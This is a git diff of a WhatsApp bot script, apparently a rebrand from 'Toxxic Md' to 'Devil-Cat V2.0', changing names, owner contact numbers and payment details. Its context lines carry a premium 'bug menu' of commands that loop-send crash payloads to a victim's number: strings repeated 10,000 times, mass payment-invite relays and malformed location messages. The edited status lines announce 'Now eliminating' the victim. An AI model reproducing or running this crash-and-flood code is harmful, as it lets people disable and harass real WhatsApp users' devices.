@@ -58,9 +58,9 @@ const ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
 const ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))
 
 //time
-const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
-        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
-        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
+const xtime = moment.tz('Africa/Lagos').format('HH:mm:ss')
+        const xdate = moment.tz('Africa/Lagos').format('DD/MM/YYYY')
+        const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss')  
          if(time2 < "23:59:00"){
 var xeonytimewisher = `Good Night 🌌`
  }
@@ -222,10 +222,10 @@ async function loading () {
 var xeonlod = [
 "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
 "《 ████▒▒▒▒▒▒▒▒》30%",
-"《 ███████▒▒Devil-Cat▒▒▒》50%",
+"《 ███████▒▒TOXXIC▒▒▒》50%",
 "《 ██████████▒▒》80%",
 "《 ████████████》100%",
-"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🤖..."
+"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 💀..."
 ]
 let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
 
@@ -262,7 +262,7 @@ await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
         }
         
         if (autobio) {
-            XeonBotInc.updateProfileStatus(`24/7 online bot created by Lord No Name called Devil-Cat-V2${ownername}`).catch(_ => _)
+            XeonBotInc.updateProfileStatus(`24/7 Online Bot. *Youtube search- Tech God* user ${ownername}`).catch(_ => _)
         }
         if (m.sender.startsWith('92') && global.anti92 === true) {
             return XeonBotInc.updateBlockStatus(m.sender, 'block')
@@ -974,7 +974,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'buypremium':
             case 'buyprem':
             case 'premium': {
-                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the Toxxic Md wa.me/33757054414 😉`
+                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with Lord No Name wa.me/2348133286181 😉`
                 await XeonBotInc.sendMessage(m.chat, {
                     text: teks,
                     contextInfo: {
@@ -994,14 +994,14 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             }
             break
             case 'runtime':
-                let runtimetext = `Toxxic Md Have Been Running For ${runtime(process.uptime())}`
+                let runtimetext = ` Devil_Cat V2.0 Have Been Running For ${runtime(process.uptime())}`
                 XeonBotInc.sendMessage(m.chat, {
                     text: runtimetext,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
                             title: `${botname}`,
-                            body: `Toxxic Md`,
+                            body: `Devil Cat V2.0 Md`,
                             thumbnailUrl: 'https://i.ibb.co/5hYWrRH/thumb.png',
                             sourceUrl: global.link,
                             mediaType: 1,
@@ -1016,7 +1016,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'script':
             case 'scriptbot':
                 XeonBotInc.sendMessage(m.chat, {
-                    text: `Search on youtube No Name `,
+                    text: `Search on youtube No Name Tech `,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
@@ -1036,7 +1036,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'donasi':
                 let textnate = `Hello Friend ${pushname}\n\nSend funds make i chop na`
                 XeonBotInc.sendMessage(m.chat, {
-                    text: 'OPay 9071884720\n\n' + textnate
+                    text: 'OPay 8034233635\n\n' + textnate
                 }, {
                     quoted: m
                 })
@@ -1046,7 +1046,7 @@ const repf = await XeonBotInc.sendMessage(from, {
 contacts: { 
 displayName: `${list.length} Contact`, 
 contacts: list }, mentions: [sender] }, { quoted: m })
-XeonBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
+XeonBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my Awesome owner😇`, mentions: [sender]}, { quoted: repf })
 }
 break
             case 'sticker':
@@ -1813,7 +1813,7 @@ break
 case 'xreact': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!m.quoted) return replygcxeon(`Example usage: ${prefix + command} reply chat`)
-await XeonBotInc.sendMessage(m.chat, { text: 'Bug Sent Successfully', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
+await XeonBotInc.sendMessage(m.chat, { text: 'The weak has been eliminated', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
 await sleep(2000)
 await XeonBotInc.sendMessage(m.chat, { react: { text: '💀', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
 }
@@ -1836,7 +1836,7 @@ amount = text.split("|")[1] * 30
 for (let i = 0; i < amount; i++) {
 await XeonBotInc.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
 }
-replygcxeon(`Successfully Sent Bug To ${victim}`)
+replygcxeon(`Now eliminating ${victim}`)
 }
 break
 case 'iosbug2': {
@@ -1859,7 +1859,7 @@ for (let i = 0; i < amount; i++) {
 await XeonBotInc.relayMessage(victim, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
 await sleep(1400)
 }
-replygcxeon(`Successfully Sent Bug To ${victim}`)
+replygcxeon(`Now eliminating ${victim}`)
 }
 break
 case 'xaudio2': {
@@ -1880,7 +1880,7 @@ amount = text.split("|")[1] * 30
 for (let i = 0; i < amount; i++) {
 await XeonBotInc.sendMessage(victim, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
 }
-replygcxeon(`Successfully Sent Bug To ${victim}`)
+replygcxeon(`Now eliminating ${victim}`)
 }
 break
 case 'xsticker': {
@@ -1892,7 +1892,7 @@ amount = text.split("|")[1] * 30
 for (let i = 0; i < amount; i++) {
 await XeonBotInc.sendVideoAsSticker(victim, xsteek, xbug2, { packname: packname, author: author })
 }
-replygcxeon(`Successfully Sent Bug To ${victim}`)
+replygcxeon(`Now eliminating ${victim}`)
 }
 break
 case 'xsticker2': {
@@ -1924,7 +1924,7 @@ XeonOP = ownername.repeat(0)
 for (let i = 0; i < amount; i++) {
 XeonBotInc.sendMessage(victim, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${XeonOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
 }
-replygcxeon(`Successfully Sent Bug To ${victim}`)
+replygcxeon(`Now eliminating ${victim}`)
 }
 break
 case 'xlist': {
@@ -1935,7 +1935,7 @@ amount = text.split("|")[1] * 30
 for (let i = 0; i < amount; i++) {
 await XeonBotInc.sendMessage(victim, { text: '' }, { quoted: xbug2 })
 }
-replygcxeon(`Successfully Sent Bug To ${victim}`)
+replygcxeon(`Now eliminating ${victim}`)
 }
 break
 case 'xlist2': {
@@ -2014,7 +2014,7 @@ dropNumber()
 break
 case 'iosq':{
 if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 234xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "50"
 for (let i = 0; i < amount; i++) {
@@ -2036,12 +2036,12 @@ extendedTextMessage:{
 }
 },{messageId: null})
 }
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+replygcxeon(`*Successfully eliminated ${victim} Please pause for 3 minutes*`)
 }
 break
 case 'iosgoogle': {
 if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 234xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "50"
 for (let i = 0; i < amount; i++) {
@@ -2060,7 +2060,7 @@ sourceUrl: link,
 }}
 })
 }
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+replygcxeon(`*Successfully eliminated ${victim} Please pause for 3 minutes*`)
 }
 break
 case 'iosgoogle2': {
@@ -2099,7 +2099,7 @@ expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000)
 }},{})
 await sleep(3000)
 }
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+replygcxeon(`*Successfully eliminated ${victim} Please pause for 3 minutes*`)
 break
 case 'xioscrash2':{
 if (!isPremium) return replygcxeon(mess.prem)
@@ -2472,15 +2472,15 @@ break
             case 'alive':
                 let xeonmenuoh = `Hello ${pushname}
 ╰┈➤ ${xeonytimewisher} 😎
-*BOT NAME: TOXXIC-MD-BUG-BOT*
+*BOT NAME: Devil_Cat-V2.0-BUG-BOT*
 
 
-⚠️⚠️ ~DONT USE BUG MENU ON INNOCENT PEOPLE ELSE I'LL BAN YOUR ACCOUNT~ ⚠️⚠️
+⚠️⚠️ ~DONT USE BUGS ON INNOCENT PEOPLE ELSE I'LL BAN YOUR ACCOUNT~ ⚠️⚠️
 
 
-Any help: DM  wa.me/33757054414
+Any help: DM  wa.me/2348133286181
 
-THIS IS MY BEAUTIFUL MENU
+THIS IS MY AMAZING MENU
 ╰┈➤ʙᴜɢ ᴍᴇɴᴜ
 xreact <reply chat>
 x <number|amount>
